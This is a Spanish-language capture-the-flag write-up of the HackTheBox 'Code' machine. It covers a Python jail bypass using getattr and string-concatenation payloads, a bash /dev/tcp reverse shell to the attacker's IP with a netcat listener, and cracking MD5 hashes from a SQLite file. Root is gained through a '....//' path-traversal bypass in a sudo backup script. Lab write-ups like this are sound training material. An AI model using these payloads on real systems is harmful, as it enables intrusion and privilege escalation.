--- 
title: Code 
os: Linux 
dificultad: Facil 
img: Code_logo.png 
skills:
  - Web Enumeration
  - Python Jail (Reverse Shell Restriction Bypass)
  - Database SQLite File Enumeration
  - Cracking Hashes
  - Directory Path Traversal Restriction Bypass 
  - Abusing Sudoers (Privelege Escalation)
plataforma: Hackthebox 
description: Code es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail.
--- 

### Descripción

Code es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.

### Objetivos

#### Objetivo general

Desarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code. 

#### Objetivos Especificos

- Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec. 
- Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail. 
- Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario. 
- Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.<br>  


### Analisis de Vulnerabilidades

#### Reconocimiento Inicial

Se comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:

**Ping**, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el **TTL**.

[![Ejecución del comando ping](/code/ping.png)](/code/ping.png)

**Nmap**, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.

[![Ejecución del comando ping](/code/nmap.png)](/code/nmap.png)

Este proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.

### Analisis de los servicios activos

Seguidamente, una vez identificados los servicios activos en el sistema objetivo en este caso, el puerto 22/TCP, correspondiente al servicio SSH (Secure Shell), y el puerto 5000/TCP, que aloja un servicio web se procede a realizar un escaneo más exhaustivo y especı́fico sobre cada uno de ellos.

#### Puerto 22 (SSH)

El hecho de que el puerto 22/TCP se encuentre activo indica que el sistema dispone de un servicio SSH (Secure Shell) en ejecución, lo que permite establecer una conexión remota segura mediante el uso de protocolos de cifrado para la transmisión de datos. Este servicio, comúnmente utilizado para la administración de servidores y dispositivos de red, brinda acceso a una lı́nea de comandos del sistema de destino, desde la cual es posible ejecutar comandos y realizar tareas de gestión.

La presencia de SSH implica que, si se dispone de credenciales válidas o se logra explotar alguna vulnerabilidad en su configuración o implementación, un atacante podrı́a obtener control remoto sobre el sistema. Por este motivo, resulta fundamental identificar la versión exacta del servicio, verificar la fortaleza de los mecanismos de autenticación implementados y evaluar la existencia de vulnerabilidades conocidas asociadas a esa versión especı́fica.

En el contexto de una evaluación de seguridad, este hallazgo se considera un punto de interés clave, ya que un servicio SSH mal configurado o desactualizado puede convertirse en una puerta de entrada directa al sistema.

El analisis demuestra que este servicio se esta ejecutando en un sistema operativo ubuntu como se muestra en la
siguiente imagen:

[![Servicio de SSH (Secure Shell)](/code/ssh.png)](/code/ssh.png)

#### Puerto 5000 (Servicio Web)

Al ejecutar el comando **whatweb** desde la terminal, se obtiene información detallada acerca de las tecnologı́as y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este análisis revela que el servicio está siendo ejecutado mediante **Gunicorn 20.0.4**.

**Gunicorn** (Green Unicorn) es un servidor WSGI para aplicaciones Python ampliamente utilizado en entornos de producción debido a su simplicidad y eficiencia. La identificación de su versión especı́fica, en este caso **20.0.4**, resulta relevante ya que permite verificar si existen vulnerabilidades conocidas o configuraciones inseguras asociadas a dicha versión. Este tipo de información es fundamental para orientar fases posteriores de análisis, como la búsqueda en bases de datos de vulnerabilidades (por ejemplo, CVE o Exploit-DB) y la evaluación de posibles vectores de ataque contra el servicio.

[![Servicio web puerto 5000 (Gunicorn)](/code/port5000.png)](/code/port5000.png)

Al acceder al servicio web mediante un navegador utilizando la URL http://10.10.11.62:5000, se observa que el sistema está ejecutando un editor de código para el lenguaje de programación Python. Esta interfaz permite al usuario escribir y ejecutar código Python directamente desde el navegador, lo cual facilita la interacción y el desarrollo rápido dentro del entorno proporcionado.

Si bien esta funcionalidad puede resultar muy útil en contextos controlados y para propósitos legı́timos, también implica un nivel considerable de riesgo desde la perspectiva de seguridad. La capacidad de ejecutar código remotamente sin las debidas restricciones o controles puede exponer el sistema a vulnerabilidades crı́ticas, tales como la ejecución arbitraria de código, escalación de privilegios o acceso no autorizado a recursos sensibles.

[![Pagina web que corre un editor de código en lı́nea](/code/webpage.png)](/code/webpage.png)


### Explotación del Sistema 

Dado que podemos ejecutar código directamente desde la página de inicio, no es necesario crear una cuenta, a menos que queramos guardar o realizar un seguimiento de nuestro trabajo. Primero intentaremos cargar algunos módulos comunes, como import, os, write u open, ya que son fundamentales para ejecutar cargas útiles que interactúan con el sistema subyacente. Sin embargo, veremos inmediatamente que hay un filtro para impedirnos utilizar palabras clave restringidas y bloquear el uso de funciones y módulos potencialmente peligrosos.

[![Implementación de reglas para impedir el uso de cargas útiles](/code/payload1.png)](/code/payload1.png)

Dada la presencia de mecanismos de filtrado que restringen la ejecución directa de código en el servicio web, se torna indispensable identificar métodos para eludir estos filtros con el fin de avanzar en la evaluación de seguridad. Para ello, se llevó a cabo una investigación exhaustiva utilizando palabras clave como “python bypass” en motores de búsqueda y bases de datos especializadas.

Como resultado, se localizaron múltiples artı́culos y recursos técnicos que describen diversas técnicas para superar las restricciones impuestas en entornos Python. Estas técnicas incluyen manipulación avanzada de la sintaxis, uso de codificaciones alternativas, construcción dinámica de código y explotación de vulnerabilidades en componentes especı́ficos.

La información recopilada servirá como fundamento para la implementación de pruebas controladas destinadas a validar la efectividad de los filtros y detectar posibles brechas que puedan ser explotadas.

#### Uso de build-in 

En Python, los built-in (o funciones y objetos incorporados) son un conjunto de funciones, excepciones y tipos de datos que están disponibles de forma inmediata sin necesidad de importar ningún módulo o librerı́a adicional. Estos elementos forman parte del núcleo del lenguaje y proporcionan funcionalidades esenciales para realizar tareas comunes de programación.

### Uso de getattr para evadir restricciones en Python

La función incorporada getattr(objeto, nombre atributo) en Python permite acceder dinámicamente a los atributos o métodos de un objeto usando el nombre del atributo como una cadena. Este comportamiento es especialmente útil para evadir filtros y restricciones que bloquean el acceso directo a funciones o métodos sensibles. En entornos con mecanismos de seguridad que detectan y bloquean llamadas explı́citas a funciones peligrosas (por ejemplo, os.system), getattr puede ser usada para ocultar la intención real del código. Como en el siguiente código:

```python
test = getattr(print.__self__, '__im' + 'port__') ('o' + 's')
getattr(test, 'sy' + 'stem')( 'whoami')
```

Otro método efectivo para evadir restricciones en entornos Python está explicado en un 
<a href="https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d" 
   class="text-blue-500 font-bold underline hover:text-blue-700 transition">
   artículo publicado en Medium
</a>. A continuación, se presenta el fragmento de código descrito en dicho artículo:


```python
[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('ls')
```

#### Ejecución de comandos en el sistema

Esto nos permitirá ejecutar comandos de shell sin utilizar palabras clave prohibidas como **≪import≫** u **≪os≫** directamente, utilizando la concatenación de cadenas, es decir, **≪o≫** + **≪s≫**. Sin embargo, tras ejecutar el código, no vemos ningún resultado. Esto sugiere que, aunque el código se esté ejecutando en el host, el resultado no se está devolviendo al frontend. Para verificar si se está ejecutando en el host, modificaremos nuestro enfoque e intentaremos redirigir el resultado a nuestra máquina utilizando un sencillo listener con el comando **tcpdump** para capturar la respuesta del comando **ping** ejecutado desde el servicio web.

```python
test = getattr(print.__self__, '__im' + 'port__') ('o' + 's')
getattr (test, 'sy' + 'stem')('ping -c 1 10.10.x.x')
```

Ejecución del código python en la web:

[![Código python en la web](/code/payload2.png)](/code/payload2.png)

Recibimos respuesta por parte del servido al ejecutar el comandon **ping**:

[![Respuesta del comando ping](/code/term1.png)](/code/term1.png)

Seguidamente ejecutaremos el siguiente código en el servicio web para obtener una **shell inversa** mediante **Netcat**:

```python
test = getattr(print.__self__, '__im' + 'port__')('o' + 's')
getattr(test, 'sy' + 'stem')('bash -c "bash -i >& /dev/tcp/10.10.x.x/443 0>&1" ')
```
Y ejecutamos en nuestra máquina de atacante **Netcat** en el puerto que especificamos en el comando anterior:

```bash
nc -lnvp 443
```
Al ejecutar el código en el servicio web, este establece una conexión de retorno hacia nuestra máquina atacante, otorgándonos una **shell inversa**. Este tipo de acceso nos permite interactuar directamente con el sistema objetivo como si estuviéramos trabajando desde su propia terminal, posibilitando la ejecución de comandos, la navegación por el sistema de archivos y la recolección de información sensible en tiempo real.


[![Ejecucion del código en el servicio web para obtener una shell inversa](/code/payload3.png)](/code/payload3.png)

Obtenemos una **Shell Inversa** como **"app-production"** que es el usuario que esta corriendo el servicio web:

[![Obteción de la revert shell](/code/nc.png)](/code/nc.png)

Seguidamente, se procede a realizar un tratamiento de la **TTY** con el fin de mejorar la interacción con la sesión obtenida. Este proceso incluye la configuración de una terminal completamente funcional que soporte caracterı́sticas como edición de lı́nea, autocompletado y manejo de señales. De esta manera, al presionar combinaciones de teclas como **Ctrl + C**, la conexión no se interrumpe y se mantiene la estabilidad de la sesión.

```bash
# En la shell inversa obtenida, ejecutar:
python3 -c ’import pty; pty.spawn("/bin/bash")’
Ctrl+Z # Presionar las teclas
stty raw -echo; fg
reset xterm
export TERM=xterm
```
En la parpeta **home** del usuario **app-production** se encuentra la flag del usuario para ingresar en la plataforma:

[![Flag de user](/code/user.png)](/code/user.png)

Al listar los archivos y carpetas de la máquina encontramos un archivo database.db en la ruta **"/home/app-production/app/instance/database.db"** al inspecionar el archivo encontramos credenciales en **"md5"** las cuales intentamos romper obteniendo así la contraseña del usuario **development** y **martin**:

[![Archivo sqlite](/code/sqlite.png)](/code/sqlite.png)

Al utilizar hashcat para realizar un ataque de fuerza bruta mediante diccionario y romper las contraseñas obtenemos la contraseña del usuario martin:

[![Contraseña de martin](/code/hashcat.png)](/code/hashcat.png)

Al intentar conectarno a la máquina mediante **ssh** como el usuario **martin** obtenemos acceso:

[![Acceso a la máquina](/code/martin01.png)](/code/martin01.png)

Seguidamente hacemos un reconocimiento de los servicios y permisos que tiene el usuario martin al listar los privilegios del usuario con el comando "sudo -l" encontramos que puede ejecutar el comando "backy.sh" como root:

[![enumeracion del sistama como martin](/code/martin02.png)](/code/martin02.png)

Realizamos un reconocimiento del script para detectar si tiene alguna bulnerabilidad encontrando que la tarea que realiza es recibir como entrada un archivo **json** que contiene una lista de directorios para realizar un backup de los mismos:

```python
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

Encontramos una vulnerabilidad en la linea:

```python
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```

En donde el script realiza un filtrado de un path traversal eliminando el **`../`**, pero solo lo hace una vez, permitiéndonos escribir **`....//`** en el archivo JSON para apuntar a otro directorio como ser el directorio **root**. 

En el directorio home del usuario martin encontramos un directorio con el nombre backups al ingresar en el encontramos un comprimido **.tar.bz2** y un archivo **task.json** al investigar el archivo json enconramos:

[![Arvhivo task](/code/task01.png)](/code/task01.png)

Al editar el campo `directories_to_archive` y sustituir `/home/app-production/app` por `/home/....//root` dando como resultado en el archivo json:

[![Archivo json modificado](/code/task02.png)](/code/task02.png)

Al ejecutar el comando `sudo /usr/bin/backy.sh` generamos un backup de la ruta `/root` que lo almacena en el directorio `/home/martin/backups` como un comprimido `.tar.bz2` en el cual se encuentra al directorio del usuario **root**:

[![Generar comprimido directorio root](/code/task03.png)](/code/task03.png)

Proseguimos con descomprimir el archivo generado y asi poder obtener la flag del usuario **root** y si deseamo podemos conectarnos como dicho usuario mediante **ssh** debido a que obtenemos acesso a su **clave ssh**.

